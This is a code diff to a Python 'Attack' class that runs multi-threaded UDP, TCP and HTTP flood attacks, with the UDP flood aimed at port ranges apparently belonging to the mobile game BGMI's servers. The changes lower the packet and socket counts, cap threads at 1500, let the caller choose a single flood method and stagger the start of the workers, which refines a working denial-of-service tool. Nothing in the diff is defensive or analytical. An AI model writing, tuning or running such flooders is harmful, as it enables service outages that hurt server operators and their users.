@@ -16,7 +16,7 @@ class Attack:
     
     def udp_flood(self, ip, port, end):
         sockets = []
-        for _ in range(20):
+        for _ in range(10):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
@@ -26,12 +26,12 @@ class Attack:
                 pass
         
         bgmi_ports = list(range(7000, 15000)) + [10335, 17500, 20000, 27000, 8080, 8443]
-        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(30)]
+        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(20)]
         
         while self.on and time.time() < end:
             try:
-                for s in sockets[:5]:
-                    for _ in range(30):
+                for s in sockets[:3]:
+                    for _ in range(20):
                         if not self.on:
                             break
                         target_port = random.choice(bgmi_ports)
@@ -43,7 +43,7 @@ class Attack:
                                 self.bytes_out += len(payload)
                         except:
                             pass
-                time.sleep(0.001)
+                time.sleep(0.002)
             except:
                 pass
         
@@ -66,7 +66,7 @@ class Attack:
                 except:
                     pass
                 s.close()
-                time.sleep(0.001)
+                time.sleep(0.002)
             except:
                 pass
     
@@ -114,7 +114,7 @@ class Attack:
                         with self.lock:
                             self.http_fail += 1
                 
-                time.sleep(0.001)
+                time.sleep(0.002)
             except:
                 pass
     
@@ -125,30 +125,51 @@ class Attack:
         self.http_success = 0
         self.http_fail = 0
         
+        # 🔥 LIMIT THREADS TO AVOID ERROR
+        if threads > 1500:
+            threads = 1500
+            print(f"⚠️ Threads limited to 1500")
+        
         end = time.time() + dur
         
-        udp_t = int(threads * 0.5)
-        tcp_t = int(threads * 0.2)
-        http_t = int(threads * 0.3)
-        workers = []
+        if method == 'udp':
+            workers = [threading.Thread(target=self.udp_flood, args=(ip, port, end)) for _ in range(threads)]
+        elif method == 'tcp':
+            workers = [threading.Thread(target=self.tcp_flood, args=(ip, port, end)) for _ in range(threads)]
+        elif method == 'http':
+            workers = [threading.Thread(target=self.http_flood, args=(ip, port, end)) for _ in range(threads)]
+        else:
+            udp_t = int(threads * 0.5)
+            tcp_t = int(threads * 0.2)
+            http_t = int(threads * 0.3)
+            
+            if udp_t < 1: udp_t = 1
+            if tcp_t < 1: tcp_t = 1
+            if http_t < 1: http_t = 1
+            
+            workers = []
+            for _ in range(udp_t):
+                workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
+            for _ in range(tcp_t):
+                workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
+            for _ in range(http_t):
+                workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
         
-        for _ in range(udp_t):
-            workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
-        for _ in range(tcp_t):
-            workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
-        for _ in range(http_t):
-            workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
-        
-        for w in workers:
+        # 🔥 START WORKERS SLOWLY
+        for i, w in enumerate(workers):
+            if not self.on:
+                break
             w.daemon = True
             w.start()
+            if i % 100 == 0:
+                time.sleep(0.05)
         
         time.sleep(dur)
         self.on = False
         
         for w in workers:
             try:
-                w.join(timeout=1)
+                w.join(timeout=0.5)
             except:
                 pass
         
